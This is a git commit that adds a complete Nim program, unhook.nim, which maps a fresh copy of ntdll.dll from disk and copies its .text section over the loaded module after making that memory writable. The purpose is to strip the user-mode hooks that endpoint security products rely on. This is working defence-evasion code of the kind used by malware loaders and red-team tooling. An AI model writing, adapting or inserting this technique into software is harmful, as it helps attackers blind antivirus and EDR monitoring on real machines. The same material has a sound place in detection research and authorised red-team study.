03994a10335d2ad1e38cf04970a3e09c737876b6
whydee86 <43274863+whydee86@users.noreply.github.com>
2021-12-25 17:04:55 +0200

    Create unhook.nim
    unhook ntdll with pure NIM

---
+++ src/unhook.nim
@@ -0,0 +1,57 @@
+import winim
+import strutils
+import ptr_math
+import strformat
+
+proc toString(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+proc ntdllunhook(): bool =
+  let low: uint16 = 0
+  var 
+      processH = GetCurrentProcess()
+      mi : MODULEINFO
+      ntdllModule = GetModuleHandleA("ntdll.dll")
+      ntdllBase : LPVOID
+      ntdllFile : FileHandle
+      ntdllMapping : HANDLE
+      ntdllMappingAddress : LPVOID
+      hookedDosHeader : PIMAGE_DOS_HEADER
+      hookedNtHeader : PIMAGE_NT_HEADERS
+      hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  ntdllBase = mi.lpBaseOfDll
+  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
+  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  if ntdllMapping == 0:
+    echo fmt"Could not create file mapping object ({GetLastError()})."
+    return false
+  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  if ntdllMappingAddress.isNil:
+    echo fmt"Could not map view of file ({GetLastError()})."
+    return false
+  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+      if ".text" in toString(hookedSectionHeader.Name):
+          var oldProtection : DWORD = 0
+          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
+            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
+            return false
+          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
+          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
+            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
+            return false  
+  CloseHandle(processH)
+  CloseHandle(ntdllFile)
+  CloseHandle(ntdllMapping)
+  FreeLibrary(ntdllModule)
+  return true
+          
+
+when isMainModule:
+  var result = ntdllunhook()
+  echo fmt"[*] unhook Ntdll: {bool(result)}"
